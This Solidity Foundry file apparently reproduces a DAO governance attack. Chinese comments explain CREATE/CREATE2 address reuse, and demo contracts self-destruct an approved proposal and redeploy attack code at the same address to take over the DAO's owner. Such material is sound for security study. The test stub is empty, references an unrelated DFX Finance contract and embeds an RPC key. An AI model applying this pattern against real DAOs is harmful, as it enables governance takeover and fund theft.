// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./interface.sol";

 /*
    损失68wUSD 
    简单来说就是  1.用 CREATE2+salt 创建合约后 然后销毁合约 还能接着创建合约 而且地址一样
                2.用 CREATE 创建合约  其地址和 nounce 有关  比如合约创建了一个合约 nounce++  销毁后又复原了

    CREATE 操作码
        当使用 new Token() 使用的是 CREATE 操作码 ， 创建的合约地址计算函数为：
            address tokenAddr = bytes20(keccak256(senderAddress, nonce))
        创建的合约地址是通过创建者地址 + 创建者Nonce（创建合约的数量）来确定的， 由于 Nonce 总是逐步递增的， 当 Nonce 增加时，创建的合约地址总是是不同的。

    CREATE2 操作码
        当添加一个salt时 new Token{salt: bytes32()}() ，则使用的是 CREATE2 操作码 ， 创建的合约地址计算函数为：
            address tokenAddr = bytes20(keccak256(0xFF, senderAddress, salt, bytecode))
        创建的合约地址是 创建者地址 + 自定义的盐 + 要部署的智能合约的字节码， 因此 只有相同字节码 和 使用相同的盐值，才可以部署到同一个合约地址上。
    
    https://twitter.com/samczsun/status/1660012956632104960?s=61&t=Q44QDY9UqgqIZ1n7Sog2Hw
    https://learnblockchain.cn/article/5916
    https://learnblockchain.cn/article/5844
    https://rekt.news/tornado-gov-rekt/
 */
contract Attacker is Test {
    
    IDFX_Finance DFX = IDFX_Finance(DFX_xidr_usdc_v2);

    function setUp() public {
       vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/qXFbrurfVJ5Le9N3T3HwEi8Wc06v0Ud3", 15_941_703);
    }

    function testExploit() public { 

    }
}


contract DAO {
    struct Proposal {
        address target;
        bool approved;
        bool executed;
    }

    address public owner = msg.sender;
    Proposal[] public proposals;

    function approve(address target) external {
        require(msg.sender == owner, "not authorized");

        proposals.push(Proposal({target: target, approved: true, executed: false}));
    }

    function execute(uint256 proposalId) external payable {
        Proposal storage proposal = proposals[proposalId];
        require(proposal.approved, "not approved");
        require(!proposal.executed, "executed");

        proposal.executed = true;

        (bool ok, ) = proposal.target.delegatecall(
            abi.encodeWithSignature("executeProposal()")
        );
        require(ok, "delegatecall failed");
    }
}

contract Proposal {
    event Log(string message);

    function executeProposal() external {
        emit Log("Excuted code approved by DAO");
    }

    function emergencyStop() external {
        selfdestruct(payable(address(0)));
    }
}

contract Attack {
    event Log(string message);

    address public owner;

    function executeProposal() external {
        emit Log("Excuted code not approved by DAO :)");
        // For example - set DAO's owner to attacker
        owner = msg.sender;
    }
}

contract DeployerDeployer {
    event Log(address addr);

    function deploy() external {
        bytes32 salt = keccak256(abi.encode(uint(123)));
        address addr = address(new Deployer{salt: salt}());
        emit Log(addr);
    }
}

contract Deployer {
    event Log(address addr);

    function deployProposal() external {
        address addr = address(new Proposal());
        emit Log(addr);
    }

    function deployAttack() external {
        address addr = address(new Attack());
        emit Log(addr);
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}